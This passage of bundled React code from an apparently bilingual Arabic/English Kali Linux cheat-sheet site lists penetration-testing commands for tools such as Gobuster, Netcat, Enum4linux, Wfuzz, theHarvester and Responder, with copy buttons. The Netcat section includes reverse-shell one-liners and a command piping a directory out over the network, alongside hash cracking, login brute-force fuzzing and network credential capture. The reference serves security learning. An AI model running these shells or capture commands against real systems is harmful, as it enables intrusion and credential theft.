                    description: { ar: "كسر WordPress", en: "Crack WordPress" },
                },
                { command: "hashcat -m 1500 hash.txt wordlist.txt", description: { ar: "كسر DES", en: "Crack DES" } },
            ],
        },
        {
            name: "Gobuster",
            description: { ar: "أداة اكتشاف المجلدات والملفات", en: "Directory and file discovery tool" },
            commands: [
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt",
                    description: { ar: "اكتشاف المجلدات", en: "Directory discovery" },
                },
                {
                    command: "gobuster dns -d target.com -w subdomains.txt",
                    description: { ar: "اكتشاف النطاقات الفرعية", en: "Subdomain discovery" },
                },
                {
                    command: "gobuster vhost -u http://target.com -w hosts.txt",
                    description: { ar: "اكتشاف Virtual Hosts", en: "Virtual host discovery" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt",
                    description: { ar: "البحث عن امتدادات محددة", en: "Search specific extensions" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -t 50",
                    description: { ar: "50 خيط متوازي", en: "50 parallel threads" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -o results.txt",
                    description: { ar: "حفظ النتائج", en: "Save results" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -c 'session=abc123'",
                    description: { ar: "استخدام كوكيز", en: "Use cookies" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -a 'Mozilla/5.0'",
                    description: { ar: "تغيير User-Agent", en: "Custom User-Agent" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -r",
                    description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -k",
                    description: { ar: "تجاهل شهادة SSL", en: "Ignore SSL cert" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -b 404,403",
                    description: { ar: "تجاهل أكواد محددة", en: "Ignore specific codes" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -s 200,301",
                    description: { ar: "عرض أكواد محددة فقط", en: "Show only specific codes" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt --wildcard",
                    description: { ar: "التعامل مع Wildcard", en: "Handle wildcard" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -U admin -P password",
                    description: { ar: "مصادقة HTTP", en: "HTTP auth" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                {
                    command: "gobuster fuzz -u http://target.com/FUZZ -w wordlist.txt",
                    description: { ar: "وضع Fuzzing", en: "Fuzzing mode" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt --no-error",
                    description: { ar: "تجاهل الأخطاء", en: "Ignore errors" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -d",
                    description: { ar: "عرض نص الاستجابة", en: "Show response body" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt --delay 100ms",
                    description: { ar: "تأخير بين الطلبات", en: "Delay between requests" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -e",
                    description: { ar: "عرض الروابط الكاملة", en: "Show full URLs" },
                },
            ],
        },
        {
            name: "Netcat",
            description: { ar: "أداة الشبكات متعددة الاستخدامات", en: "Versatile networking tool" },
            commands: [
                { command: "nc -lvnp 4444", description: { ar: "الاستماع على منفذ", en: "Listen on port" } },
                { command: "nc 192.168.1.1 4444", description: { ar: "الاتصال بمنفذ", en: "Connect to port" } },
                {
                    command: "nc -e /bin/bash 192.168.1.1 4444",
                    description: { ar: "Reverse Shell", en: "Reverse shell" },
                },
                { command: "nc -lvnp 4444 > file.txt", description: { ar: "استقبال ملف", en: "Receive file" } },
                { command: "nc 192.168.1.1 4444 < file.txt", description: { ar: "إرسال ملف", en: "Send file" } },
                { command: "nc -zv 192.168.1.1 1-1000", description: { ar: "فحص المنافذ", en: "Port scan" } },
                { command: "nc -lvnp 4444 -k", description: { ar: "استماع مستمر", en: "Persistent listen" } },
                { command: "nc -u -lvnp 4444", description: { ar: "استماع UDP", en: "UDP listen" } },
                {
                    command: "nc -nvlp 4444 -c 'echo Welcome'",
                    description: { ar: "تنفيذ أمر عند الاتصال", en: "Execute on connect" },
                },
                {
                    command: "nc -w 5 192.168.1.1 4444",
                    description: { ar: "وقت انتظار 5 ثواني", en: "5 second timeout" },
                },
                {
                    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f",
                    description: { ar: "Reverse Shell مع FIFO", en: "Reverse shell with FIFO" },
                },
                {
                    command: "nc -lvnp 80 < index.html",
                    description: { ar: "خادم HTTP بسيط", en: "Simple HTTP server" },
                },
                {
                    command: "echo 'GET / HTTP/1.1\\nHost: target.com\\n\\n' | nc target.com 80",
                    description: { ar: "طلب HTTP يدوي", en: "Manual HTTP request" },
                },
                {
                    command: "nc -lvnp 4444 2>&1 | tee capture.txt",
                    description: { ar: "تسجيل الاتصال", en: "Log connection" },
                },
                {
                    command: "nc -x proxy:8080 target.com 80",
                    description: { ar: "الاتصال عبر بروكسي", en: "Connect via proxy" },
                },
                { command: "nc -C target.com 25", description: { ar: "اتصال SMTP", en: "SMTP connection" } },
                {
                    command: "while true; do nc -lvnp 4444; done",
                    description: { ar: "استماع متكرر", en: "Repeated listen" },
                },
                {
                    command: "nc -s 192.168.1.100 192.168.1.1 4444",
                    description: { ar: "تحديد IP المصدر", en: "Specify source IP" },
                },
                {
                    command: "nc -l 4444 | tar xvf -",
                    description: { ar: "استقبال وفك ضغط", en: "Receive and extract" },
                },
                {
                    command: "tar cf - . | nc 192.168.1.1 4444",
                    description: { ar: "ضغط وإرسال", en: "Compress and send" },
                },
            ],
        },
        {
            name: "Enum4linux",
            description: { ar: "أداة استطلاع Windows/Samba", en: "Windows/Samba enumeration tool" },
            commands: [
                { command: "enum4linux -a 192.168.1.1", description: { ar: "استطلاع شامل", en: "Full enumeration" } },
                {
                    command: "enum4linux -U 192.168.1.1",
                    description: { ar: "استخراج المستخدمين", en: "Extract users" },
                },
                {
                    command: "enum4linux -S 192.168.1.1",
                    description: { ar: "استخراج المشاركات", en: "Extract shares" },
                },
                {
                    command: "enum4linux -G 192.168.1.1",
                    description: { ar: "استخراج المجموعات", en: "Extract groups" },
                },
                {
                    command: "enum4linux -P 192.168.1.1",
                    description: { ar: "سياسة كلمات المرور", en: "Password policy" },
                },
                { command: "enum4linux -o 192.168.1.1", description: { ar: "معلومات نظام التشغيل", en: "OS info" } },
                {
                    command: "enum4linux -n 192.168.1.1",
                    description: { ar: "جدول أسماء NetBIOS", en: "NetBIOS name table" },
                },
                { command: "enum4linux -M 192.168.1.1", description: { ar: "قائمة الأجهزة", en: "Machine list" } },
                { command: "enum4linux -r 192.168.1.1", description: { ar: "استخراج RID", en: "RID enumeration" } },
                {
                    command: "enum4linux -u admin -p password 192.168.1.1",
                    description: { ar: "استطلاع مع صلاحيات", en: "Authenticated enum" },
                },
                {
                    command: "enum4linux -R 1000-2000 192.168.1.1",
                    description: { ar: "نطاق RID مخصص", en: "Custom RID range" },
                },
                { command: "enum4linux -d 192.168.1.1", description: { ar: "تفاصيل إضافية", en: "Extra details" } },
                { command: "enum4linux -K 192.168.1.1", description: { ar: "استخدام Kerberos", en: "Use Kerberos" } },
                {
                    command: "enum4linux -w DOMAIN 192.168.1.1",
                    description: { ar: "تحديد الدومين", en: "Specify domain" },
                },
                { command: "enum4linux -l 192.168.1.1", description: { ar: "معلومات LDAP", en: "LDAP info" } },
                { command: "enum4linux -A 192.168.1.1", description: { ar: "استطلاع عدواني", en: "Aggressive enum" } },
                { command: "enum4linux -v 192.168.1.1", description: { ar: "وضع مفصل", en: "Verbose mode" } },
                {
                    command: "enum4linux -s shares.txt 192.168.1.1",
                    description: { ar: "فحص من قائمة", en: "Scan from list" },
                },
                { command: "enum4linux -I 192.168.1.1", description: { ar: "معلومات الطابعات", en: "Printer info" } },
                {
                    command: "enum4linux -C 192.168.1.1",
                    description: { ar: "تعليقات المشاركات", en: "Share comments" },
                },
            ],
        },
        {
            name: "Dirb",
            description: { ar: "أداة اكتشاف محتوى الويب", en: "Web content discovery tool" },
            commands: [
                { command: "dirb http://target.com", description: { ar: "فحص أساسي", en: "Basic scan" } },
                {
                    command: "dirb http://target.com /usr/share/wordlists/dirb/big.txt",
                    description: { ar: "قائمة كبيرة", en: "Big wordlist" },
                },
                {
                    command: "dirb http://target.com -a 'Mozilla/5.0'",
                    description: { ar: "تغيير User-Agent", en: "Custom User-Agent" },
                },
                {
                    command: "dirb http://target.com -o output.txt",
                    description: { ar: "حفظ النتائج", en: "Save results" },
                },
                {
                    command: "dirb http://target.com -X .php,.html",
                    description: { ar: "امتدادات محددة", en: "Specific extensions" },
                },
                {
                    command: "dirb http://target.com -c 'PHPSESSID=abc123'",
                    description: { ar: "استخدام كوكيز", en: "Use cookies" },
                },
                {
                    command: "dirb http://target.com -u admin:password",
                    description: { ar: "مصادقة HTTP", en: "HTTP auth" },
                },
                {
                    command: "dirb http://target.com -p http://127.0.0.1:8080",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                {
                    command: "dirb http://target.com -z 10",
                    description: { ar: "تأخير 10 مللي ثانية", en: "10ms delay" },
                },
                {
                    command: "dirb http://target.com -N 404",
                    description: { ar: "تجاهل كود محدد", en: "Ignore specific code" },
                },
                { command: "dirb http://target.com -r", description: { ar: "عدم البحث العودي", en: "Non-recursive" } },
                { command: "dirb http://target.com -w", description: { ar: "تجاهل التحذيرات", en: "Ignore warnings" } },
                { command: "dirb http://target.com -S", description: { ar: "وضع صامت", en: "Silent mode" } },
                { command: "dirb http://target.com -f", description: { ar: "ضبط دقيق", en: "Fine tuning" } },
                { command: "dirb http://target.com -t", description: { ar: "عدم تفاعلي", en: "Non-interactive" } },
                { command: "dirb https://target.com", description: { ar: "فحص HTTPS", en: "HTTPS scan" } },
                { command: "dirb http://target.com:8080", description: { ar: "منفذ مخصص", en: "Custom port" } },
                {
                    command: "dirb http://target.com -H 'X-Custom: value'",
                    description: { ar: "رأس مخصص", en: "Custom header" },
                },
                {
                    command: "dirb http://target.com -i",
                    description: { ar: "بحث غير حساس للحالة", en: "Case insensitive" },
                },
                {
                    command: "dirb http://target.com /usr/share/wordlists/common.txt -x extensions.txt",
                    description: { ar: "ملف امتدادات", en: "Extensions file" },
                },
            ],
        },
        {
            name: "Wfuzz",
            description: { ar: "أداة Fuzzing لتطبيقات الويب", en: "Web application fuzzing tool" },
            commands: [
                {
                    command: "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",
                    description: { ar: "Fuzzing أساسي", en: "Basic fuzzing" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ",
                    description: { ar: "تجاهل 404", en: "Hide 404" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -d 'user=admin&pass=FUZZ' http://target.com/login",
                    description: { ar: "Fuzzing POST", en: "POST fuzzing" },
                },
                {
                    command: "wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ",
                    description: { ar: "نطاق أرقام", en: "Number range" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -H 'Cookie: session=FUZZ' http://target.com/",
                    description: { ar: "Fuzzing الكوكيز", en: "Cookie fuzzing" },
                },
                {
                    command:
                        "wfuzz -c -z file,users.txt -z file,passwords.txt http://target.com/login?user=FUZ2Z&pass=FUZZ",
                    description: { ar: "Fuzzing متعدد", en: "Multi fuzzing" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --hl 0 http://target.com/FUZZ",
                    description: { ar: "إخفاء ردود فارغة", en: "Hide empty responses" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -b 'session=abc123' http://target.com/FUZZ",
                    description: { ar: "استخدام كوكيز", en: "Use cookies" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080 http://target.com/FUZZ",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -t 50 http://target.com/FUZZ",
                    description: { ar: "50 خيط", en: "50 threads" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --sc 200 http://target.com/FUZZ",
                    description: { ar: "عرض 200 فقط", en: "Show only 200" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --sw 10 http://target.com/FUZZ",
                    description: { ar: "عرض حسب عدد الكلمات", en: "Show by word count" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ",
                    description: { ar: "عمق العودية 2", en: "Recursion depth 2" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -L http://target.com/FUZZ",
                    description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --req-delay 1 http://target.com/FUZZ",
                    description: { ar: "تأخير ثانية", en: "1 second delay" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -o json http://target.com/FUZZ",
                    description: { ar: "مخرجات JSON", en: "JSON output" },
                },
                { command: "wfuzz -e payloads", description: { ar: "عرض الحمولات المتاحة", en: "List payloads" } },
                {
                    command: "wfuzz -c -z file,wordlist.txt --script=robots http://target.com/FUZZ",
                    description: { ar: "استخدام سكربت", en: "Use script" },
                },
                {
                    command: "wfuzz -c -z list,admin-config-backup http://target.com/FUZZ",
                    description: { ar: "قائمة مباشرة", en: "Direct list" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -f output.html,html http://target.com/FUZZ",
                    description: { ar: "تقرير HTML", en: "HTML report" },
                },
            ],
        },
        {
            name: "theHarvester",
            description: { ar: "أداة جمع المعلومات والبريد الإلكتروني", en: "Email and info gathering tool" },
            commands: [
                {
                    command: "theHarvester -d target.com -b google",
                    description: { ar: "بحث Google", en: "Google search" },
                },
                {
                    command: "theHarvester -d target.com -b all",
                    description: { ar: "جميع المصادر", en: "All sources" },
                },
                {
                    command: "theHarvester -d target.com -b linkedin",
                    description: { ar: "بحث LinkedIn", en: "LinkedIn search" },
                },
                { command: "theHarvester -d target.com -b bing", description: { ar: "بحث Bing", en: "Bing search" } },
                { command: "theHarvester -d target.com -l 500", description: { ar: "500 نتيجة", en: "500 results" } },
                {
                    command: "theHarvester -d target.com -b google -f report",
                    description: { ar: "حفظ تقرير", en: "Save report" },
                },
                {
                    command: "theHarvester -d target.com -b shodan",
                    description: { ar: "بحث Shodan", en: "Shodan search" },
                },
                {
                    command: "theHarvester -d target.com -b crtsh",
                    description: { ar: "بحث الشهادات", en: "Certificate search" },
                },
                {
                    command: "theHarvester -d target.com -b virustotal",
                    description: { ar: "بحث VirusTotal", en: "VirusTotal search" },
                },
                {
                    command: "theHarvester -d target.com -b hunter",
                    description: { ar: "بحث Hunter.io", en: "Hunter.io search" },
                },
                {
                    command: "theHarvester -d target.com -b dnsdumpster",
                    description: { ar: "DNS Dumpster", en: "DNS Dumpster" },
                },
                {
                    command: "theHarvester -d target.com -b github-code",
                    description: { ar: "بحث GitHub", en: "GitHub search" },
                },
                {
                    command: "theHarvester -d target.com -b yahoo",
                    description: { ar: "بحث Yahoo", en: "Yahoo search" },
                },
                {
                    command: "theHarvester -d target.com -b baidu",
                    description: { ar: "بحث Baidu", en: "Baidu search" },
                },
                { command: "theHarvester -d target.com -n", description: { ar: "البحث عن DNS", en: "DNS lookup" } },
                { command: "theHarvester -d target.com -c", description: { ar: "البحث العميق", en: "Deep search" } },
                {
                    command: "theHarvester -d target.com -v",
                    description: { ar: "التحقق من المضيفين", en: "Verify hosts" },
                },
                { command: "theHarvester -d target.com -r", description: { ar: "البحث العكسي", en: "Reverse lookup" } },
                { command: "theHarvester -d target.com -s", description: { ar: "بداية النتائج", en: "Start result" } },
                {
                    command: "theHarvester -d target.com -b google,bing,linkedin",
                    description: { ar: "مصادر متعددة", en: "Multiple sources" },
                },
            ],
        },
        {
            name: "Maltego",
            description: { ar: "أداة تحليل الروابط والاستطلاع", en: "Link analysis and recon tool" },
            commands: [
                { command: "maltego", description: { ar: "تشغيل Maltego", en: "Start Maltego" } },
                { command: "New Graph → Add Entity", description: { ar: "إضافة كيان جديد", en: "Add new entity" } },
                {
                    command: "Entity → Domain → Run All Transforms",
                    description: { ar: "تشغيل جميع التحويلات", en: "Run all transforms" },
                },
                {
                    command: "Entity → Person → To Email Addresses",
                    description: { ar: "استخراج البريد", en: "Extract emails" },
                },
                { command: "Entity → Domain → To DNS Names", description: { ar: "أسماء DNS", en: "DNS names" } },
                { command: "Entity → IP → To Netblocks", description: { ar: "نطاقات الشبكة", en: "Netblocks" } },
                { command: "Entity → Email → To Person", description: { ar: "معلومات الشخص", en: "Person info" } },
                {
                    command: "Entity → Phone Number → To Person",
                    description: { ar: "ربط رقم بشخص", en: "Link phone to person" },
                },
                { command: "Entity → Website → To IP", description: { ar: "IP الموقع", en: "Website IP" } },
                {
                    command: "Entity → Company → To Domains",
                    description: { ar: "نطاقات الشركة", en: "Company domains" },
                },
                { command: "View → Graph Layout → Organic", description: { ar: "تخطيط عضوي", en: "Organic layout" } },
                {
                    command: "View → Graph Layout → Hierarchical",
                    description: { ar: "تخطيط هرمي", en: "Hierarchical layout" },
                },
                { command: "File → Export → As Image", description: { ar: "تصدير كصورة", en: "Export as image" } },
                { command: "File → Export → As Report", description: { ar: "تصدير كتقرير", en: "Export as report" } },
                { command: "Transform Hub → Install", description: { ar: "تثبيت تحويلات", en: "Install transforms" } },
                { command: "Settings → API Keys", description: { ar: "إعداد مفاتيح API", en: "Set API keys" } },
                {
                    command: "Entity → Social Network → To Profile",
                    description: { ar: "ملفات التواصل", en: "Social profiles" },
                },
                {
                    command: "Entity → Hash → To Malware",
                    description: { ar: "تحليل البرمجيات الخبيثة", en: "Malware analysis" },
                },
                { command: "Entity → Location → To GPS", description: { ar: "إحداثيات GPS", en: "GPS coordinates" } },
                { command: "File → New Machine", description: { ar: "آلة جديدة", en: "New machine" } },
            ],
        },
        {
            name: "Responder",
            description: { ar: "أداة التقاط كلمات المرور في الشبكة", en: "Network password capture tool" },
            commands: [
                {
                    command: "responder -I eth0",
                    description: { ar: "الاستماع على الواجهة", en: "Listen on interface" },
                },
                { command: "responder -I eth0 -wrf", description: { ar: "وضع متقدم", en: "Advanced mode" } },
                { command: "responder -I eth0 --lm", description: { ar: "التقاط LM", en: "Capture LM" } },
                { command: "responder -I eth0 -b", description: { ar: "تعطيل NBNS", en: "Disable NBNS" } },
                { command: "responder -I eth0 -r", description: { ar: "تحليل NetBIOS", en: "NetBIOS analysis" } },
                { command: "responder -I eth0 -d", description: { ar: "تحليل DHCP", en: "DHCP analysis" } },
                { command: "responder -I eth0 -w", description: { ar: "خادم WPAD", en: "WPAD server" } },
                { command: "responder -I eth0 -F", description: { ar: "فرض WPAD", en: "Force WPAD" } },
                { command: "responder -I eth0 -P", description: { ar: "بروكسي WPAD", en: "WPAD proxy" } },
                { command: "responder -I eth0 -v", description: { ar: "وضع مفصل", en: "Verbose mode" } },
                { command: "responder -I eth0 --disable-ess", description: { ar: "تعطيل ESS", en: "Disable ESS" } },
                { command: "responder -I eth0 -e IP", description: { ar: "IP خارجي", en: "External IP" } },
                { command: "cat /usr/share/responder/logs/*", description: { ar: "عرض السجلات", en: "View logs" } },
                { command: "responder --version", description: { ar: "عرض الإصدار", en: "Show version" } },
                { command: "responder -I eth0 -A", description: { ar: "وضع التحليل فقط", en: "Analyze only mode" } },
                {
                    command: "hashcat -m 5600 hash.txt wordlist.txt",
                    description: { ar: "كسر NTLMv2", en: "Crack NTLMv2" },
                },
                { command: "responder -I eth0 --basic", description: { ar: "مصادقة أساسية", en: "Basic auth" } },
                { command: "responder -I eth0 --wredir", description: { ar: "إعادة توجيه WPAD", en: "WPAD redirect" } },
                { command: "responder -I eth0 --lldp", description: { ar: "LLDP Spoofing", en: "LLDP Spoofing" } },
                { command: "responder -I eth0 -i IP", description: { ar: "IP محدد", en: "Specific IP" } },
            ],
        },
    ],
    hk = () => {
        const [e, t] = x.useState(0),
            [n, r] = x.useState(null),
            [o, i] = x.useState(""),
            [s, a] = x.useState("ar"),
            c = (m) => {
                navigator.clipboard.writeText(m), r(m), setTimeout(() => r(null), 2e3);
            },
            u = x.useMemo(() => {
                if (!o.trim()) return Wo;
                const m = o.toLowerCase();
                return Wo.filter(
                    (f) =>
                        f.name.toLowerCase().includes(m) ||
                        f.description.ar.includes(o) ||
                        f.description.en.toLowerCase().includes(m) ||
                        f.commands.some(
                            (S) =>
                                S.command.toLowerCase().includes(m) ||
                                S.description.ar.includes(o) ||
                                S.description.en.toLowerCase().includes(m)
                        )
                );
            }, [o]),
            d = Wo.reduce((m, f) => m + f.commands.length, 0),
            p = {
                title: s === "ar" ? "أدوات كالي لينكس" : "Kali Linux Tools",
                subtitle:
                    s === "ar"
                        ? `${Wo.length} أداة احترافية مع ${d} أمر`
                        : `${Wo.length} professional tools with ${d} commands`,
                search: s === "ar" ? "ابحث عن أداة أو أمر..." : "Search for a tool or command...",
                commands: s === "ar" ? "أمر" : "commands",
            };
        return l.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                l.jsx(Or, {}),
                l.jsx("main", {
                    className: "pt-24 pb-16",
                    children: l.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            l.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    l.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: l.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: l.jsx(Ar, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    l.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            l.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: p.title,
                                            }),
                                            l.jsx("button", {
                                                onClick: () => a((m) => (m === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: l.jsx(zi, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    l.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: p.subtitle,
                                    }),
                                ],
                            }),
                            l.jsx("div", {
                                className: "max-w-2xl mx-auto mb-10",
                                children: l.jsxs("div", {
                                    className: "relative",
                                    children: [
                                        l.jsx(br, {
                                            className:
                                                "absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground",
                                        }),
                                        l.jsx("input", {
                                            type: "text",
                                            value: o,
                                            onChange: (m) => i(m.target.value),
                                            placeholder: p.search,
                                            className:
                                                "w-full px-4 py-3 pr-12 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all",
                                            dir: s === "ar" ? "rtl" : "ltr",
                                        }),
                                    ],
                                }),
                            }),
                            l.jsx("div", {
                                className: "max-w-6xl mx-auto space-y-4",
                                children: u.map((m, f) =>
                                    l.jsxs(
                                        "div",
                                        {
                                            className: "cyber-card overflow-hidden",
                                            children: [
                                                l.jsxs("button", {
                                                    onClick: () => t(e === f ? null : f),
                                                    className:
                                                        "w-full p-5 flex items-center justify-between hover:bg-primary/5 transition-colors",
                                                    children: [
                                                        l.jsxs("div", {
                                                            className: "flex items-center gap-4",
                                                            children: [
                                                                l.jsx("div", {
                                                                    className:
                                                                        "w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center",
                                                                    children: (() => {
                                                                        const S = mk[m.name] || Ar;
                                                                        return l.jsx(S, {
                                                                            className: "w-6 h-6 text-primary",
                                                                        });
                                                                    })(),
                                                                }),
                                                                l.jsxs("div", {
                                                                    className: s === "ar" ? "text-right" : "text-left",
                                                                    children: [
                                                                        l.jsx("h3", {
                                                                            className: "text-xl font-bold text-primary",
                                                                            children: m.name,
                                                                        }),
                                                                        l.jsx("p", {
                                                                            className: "text-muted-foreground text-sm",
                                                                            children:
                                                                                s === "ar"
                                                                                    ? m.description.ar
                                                                                    : m.description.en,
                                                                        }),
                                                                    ],
                                                                }),
                                                            ],
                                                        }),
                                                        l.jsxs("div", {
                                                            className: "flex items-center gap-3",
                                                            children: [
                                                                l.jsxs("span", {
                                                                    className: "text-muted-foreground text-sm",
                                                                    children: [m.commands.length, " ", p.commands],
                                                                }),
                                                                e === f
                                                                    ? l.jsx(oa, { className: "w-6 h-6 text-primary" })
                                                                    : l.jsx(ra, {
                                                                          className: "w-6 h-6 text-muted-foreground",
                                                                      }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                                e === f &&
                                                    l.jsx("div", {
                                                        className:
                                                            "border-t border-border/30 p-4 grid grid-cols-1 md:grid-cols-2 gap-3 animate-fade-in",
                                                        children: m.commands.map((S, y) =>
                                                            l.jsxs(
                                                                "div",
                                                                {
                                                                    className:
                                                                        "flex items-start gap-3 p-3 rounded-xl bg-secondary/50 hover:bg-secondary/80 transition-colors group",
                                                                    children: [
                                                                        l.jsx("span", {
                                                                            className:
                                                                                "w-7 h-7 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-xs flex-shrink-0",
                                                                            children: y + 1,
                                                                        }),
                                                                        l.jsxs("div", {
                                                                            className: "flex-1 min-w-0",
                                                                            children: [
                                                                                l.jsxs("div", {
                                                                                    className:
                                                                                        "flex items-center gap-2 mb-1",
                                                                                    children: [
                                                                                        l.jsx("code", {
                                                                                            className:
                                                                                                "text-primary text-xs font-mono bg-background/50 px-2 py-0.5 rounded break-all",
                                                                                            dir: "ltr",
                                                                                            children: S.command,
                                                                                        }),
                                                                                        l.jsx("button", {
                                                                                            onClick: () => c(S.command),
                                                                                            className:
                                                                                                "p-1 rounded hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0",
                                                                                            children:
                                                                                                n === S.command
                                                                                                    ? l.jsx($u, {
                                                                                                          className:
                                                                                                              "w-3 h-3 text-primary",
                                                                                                      })
                                                                                                    : l.jsx(Da, {
                                                                                                          className:
                                                                                                              "w-3 h-3 text-muted-foreground",
                                                                                                      }),
                                                                                        }),
                                                                                    ],
                                                                                }),
                                                                                l.jsx("p", {
                                                                                    className:
                                                                                        "text-muted-foreground text-xs",
                                                                                    children:
                                                                                        s === "ar"
                                                                                            ? S.description.ar
                                                                                            : S.description.en,
                                                                                }),
                                                                            ],
                                                                        }),
                                                                    ],
                                                                },
                                                                y
                                                            )
                                                        ),
                                                    }),
                                            ],
                                        },
                                        f
                                    )
                                ),
                            }),
                        ],
                    }),
                }),
                l.jsx(_r, {}),
            ],
        });
    },
    gk = [
        {
            command: "cd /path/to/directory",
            description: { ar: "تغيير المجلد الحالي", en: "Change current directory" },
            icon: l.jsx(Cl, { className: "w-4 h-4" }),
            category: "navigation",
        },
        {
            command: "cd ..",
            description: { ar: "الرجوع للمجلد السابق", en: "Go to parent directory" },
            icon: l.jsx(Np, { className: "w-4 h-4 rotate-180" }),
            category: "navigation",
        },
        {
            command: "cd ~",
            description: { ar: "الذهاب للمجلد الرئيسي", en: "Go to home directory" },
            icon: l.jsx(gx, { className: "w-4 h-4" }),
            category: "navigation",
        },
        {
            command: "pwd",
            description: { ar: "عرض المسار الحالي", en: "Print working directory" },
            icon: l.jsx(Cl, { className: "w-4 h-4" }),
            category: "navigation",
        },
        {
            command: "ls",
            description: { ar: "عرض محتويات المجلد", en: "List directory contents" },
            icon: l.jsx(jp, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "ls -la",
            description: { ar: "عرض كل الملفات مع التفاصيل", en: "List all files with details" },
            icon: l.jsx(aa, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "ls -lh",
            description: { ar: "عرض الملفات بأحجام مقروءة", en: "List with human-readable sizes" },
            icon: l.jsx(In, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "tree",
            description: { ar: "عرض هيكل المجلدات", en: "Display directory tree" },
            icon: l.jsx(yg, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "cat filename",
            description: { ar: "عرض محتوى ملف", en: "Display file content" },
            icon: l.jsx(In, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "head -n 10 filename",
            description: { ar: "عرض أول 10 أسطر", en: "Show first 10 lines" },
            icon: l.jsx(In, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "tail -n 10 filename",
            description: { ar: "عرض آخر 10 أسطر", en: "Show last 10 lines" },
            icon: l.jsx(In, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "less filename",
            description: { ar: "قراءة ملف مع التمرير", en: "View file with scrolling" },
            icon: l.jsx(aa, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "nano filename",
            description: { ar: "تحرير ملف بمحرر nano", en: "Edit file with nano" },
            icon: l.jsx(Mp, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "vim filename",
            description: { ar: "تحرير ملف بمحرر vim", en: "Edit file with vim" },
            icon: l.jsx(Mp, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "touch filename",
            description: { ar: "إنشاء ملف جديد", en: "Create new file" },
            icon: l.jsx(In, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "cp source dest",
            description: { ar: "نسخ ملف أو مجلد", en: "Copy file or directory" },
            icon: l.jsx(Da, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "mv source dest",
            description: { ar: "نقل أو إعادة تسمية", en: "Move or rename" },
            icon: l.jsx(Np, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "rm filename",
